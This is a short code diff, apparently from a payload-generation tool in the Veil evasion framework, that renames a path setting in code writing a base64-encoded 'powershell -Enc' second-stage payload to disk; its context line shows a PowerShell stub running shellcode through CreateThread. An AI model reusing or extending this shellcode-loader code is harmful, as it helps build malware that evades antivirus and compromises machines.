@@ -60,8 +60,8 @@ $z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 		payloadName = randomizer.randomString()
 		
 		# write base64 payload out to disk
-		veil.PAYLOAD_SOURCE_PATH
-		secondStageName = veil.PAYLOAD_SOURCE_PATH + payloadName
+		settings.PAYLOAD_SOURCE_PATH
+		secondStageName = settings.PAYLOAD_SOURCE_PATH + payloadName
 		f = open( secondStageName , 'w')
 		f.write("powershell -Enc %s\n" %(powershell_command))
 		f.close()
